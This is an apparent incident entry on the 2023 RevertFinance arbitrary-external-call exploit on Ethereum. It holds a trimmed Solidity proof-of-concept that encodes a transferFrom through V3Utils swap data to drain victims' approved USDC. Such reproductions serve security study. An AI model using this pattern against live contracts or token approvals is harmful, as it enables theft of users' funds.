# [?] - RevertFinance - Arbitrary External Call Vulnerability

## Summary
Severity: Unknown
Chain: Ethereum
Component: RevertFinance
Published: 2023-02-18
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/RevertFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$30k
References:
- https://mirror.xyz/revertfinance.eth/3sdpQ3v9vEKiOjaHXUi3TdEfhleAXXlAEWeODrRHJtU
- https://etherscan.io/tx/0xdaccbc437cb07427394704fbcc8366589ffccf974ec6524f3483844b043f31d5

```solidity
contract ContractTest is Test {
    V3Utils utils = V3Utils(0x531110418d8591C92e9cBBFC722Db8FFb604FAFD);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address[] victims = [0x067D0F9089743271058D4Bf2a1a29f4E9C6fdd1b, 0x4107A0A4a50AC2c4cc8C5a3954Bc01ff134506b2];
    uint256 counter;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_653_389);
        cheats.label(address(utils), "utils");
        cheats.label(address(USDC), "USDC");
    }

    function testExploit() external {
        for (uint256 i; i < victims.length; ++i) {
            uint256 transferAmount = USDC.balanceOf(victims[i]);
            if (USDC.allowance(victims[i], address(utils)) < transferAmount) {
                transferAmount = USDC.allowance(victims[i], address(utils));
                if (transferAmount == 0) continue;
            }
            bytes memory data = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)", victims[i], address(this), transferAmount
            );
            bytes memory swapdata = abi.encode(address(USDC), address(this), data);
            V3Utils.SwapParams memory params = V3Utils.SwapParams({
                tokenIn: address(this),
                tokenOut: address(this),
                amountIn: 1,
                minAmountOut: 0,
                recipient: address(this),
                swapData: swapdata,
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/RevertFinance_exp.sol_
